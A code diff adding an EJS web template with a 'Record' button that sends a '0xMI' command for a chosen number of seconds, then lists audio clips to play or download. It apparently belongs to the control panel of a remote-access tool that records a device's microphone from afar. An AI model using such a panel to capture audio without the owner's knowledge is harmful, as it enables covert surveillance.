@@ -1,0 +1,94 @@
+<div class="ui segment">
+    <div>
+        <div class="ui action input fluid">
+            <input type="number" placeholder="Duration (seconds)" min="0" max="120" id="seconds">
+            <button onclick="record(this)" class="ui red left labeled icon button">
+                <i class="microphone icon"></i>
+                Record
+            </button>
+        </div>
+        <div class="ui attached progress indicating active" id="recProg">
+            <div class="bar"></div>
+        </div>
+    </div>
+
+    <audio id="player">
+        <source id="audioSource" src="" type="audio/mpeg">
+        </source>
+        Your browser does not support the audio element.
+    </audio>
+
+    <script>
+        function playClip(input) {
+            var player = document.getElementById('player');
+            $("#audioSource").attr("src", input);
+            player.load();
+            var playPromise = player.play();
+            if (playPromise !== undefined) playPromise.then(_ => { }).catch(error => { });
+        }
+
+    </script>
+
+
+    <table class="ui celled table">
+        <thead>
+            <tr>
+                <th>Time</th>
+                <th>Name</th>
+                <th>Actions</th>
+            </tr>
+        </thead>
+        <tbody>
+            <% pageData.forEach((item) => { 
+                let date = new Date(item.time);
+            %>
+            <tr>
+                <td class="collapsing"><%= date.toLocaleString('en-GB', { timeZone: 'UTC' }) %></td>
+                <td><%= item.originalName %></td>
+                <td class="collapsing">
+                    <div class="ui buttons">
+                        <button onclick="playClip('<%= item.path %>')" class="ui button blue">Play</button>
+                        <div class="or"></div>
+                        <a href="<%= item.path %>" download="<%= item.originalName %>"
+                            class="ui positive button">Save</a>
+                    </div>
+                </td>
+            </tr>
+            <% }) %>
+        </tbody>
+    </table>
+
+
+    <script>
+        function record(element) {
+            $(element).addClass('loading')
+            let sec = $('#seconds').val();
+            sendCommand('0xMI', { sec }, (error, message) => {
+                if (error) {
+                    setTimeout(() => {
+                        showNotification('#f03434', error)
+                        $(element).removeClass('loading')
+                    }, 300)
+                } else {
+                    setTimeout(() => {
+                        $(element).removeClass('loading');
+
+                        let timeLeft = ((parseInt(sec) + 10) * 1000);
+                        let timeItsGonnaTake = (parseInt(sec) + 10);
+
+                        if (message === 'Requested') {
+                            showNotification('#2ecc71', 'Now Recording, Check back in ' + timeItsGonnaTake + ' ish Seconds for the result!');
+                            let cdInterval = setInterval(() => {
+                                timeLeft = timeLeft - 100;
+                                let percent = (((timeItsGonnaTake * 1000) * 100) / timeLeft) - 100;
+                                $('#recProg').progress({ percent });
+                                if (percent > 100) window.location = window.location;
+                            }, 100)
+                        } else showNotification('#2ecc71', message);
+                    }, 300)
+                }
+            });
+        }
+    </script>
+
+</div>
